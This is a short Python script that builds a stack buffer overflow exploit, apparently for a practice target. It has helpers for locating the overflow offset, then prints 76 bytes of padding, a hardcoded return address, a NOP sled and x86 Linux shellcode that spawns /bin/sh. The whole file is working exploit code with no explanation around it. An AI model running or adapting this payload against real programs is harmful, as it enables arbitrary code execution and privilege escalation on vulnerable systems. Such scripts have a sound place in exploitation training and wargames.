#!/usr/bin/env python

import struct

def pattern_create(length):
	start = 65
	pattern = ""
	for i in range(length):
		for i in range(4):
			pattern += chr(start)
		start += 1
	return pattern

def pattern_find(pattern):
	tmp = []
	full = pattern_create(100)
	for i in range(len(full) - 3):
		if full[i] == pattern[0] and full[i+1] == pattern[1] and full[i+2] == pattern[2] and full[i+3] == pattern[3]:
			return i
	return -1

if __name__ == "__main__":
	offset = 'A' * 76
	eip = struct.pack("I", 0xbffff740+64)
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
	payload = '\x90'*100 + shellcode
	print(offset + eip + payload)
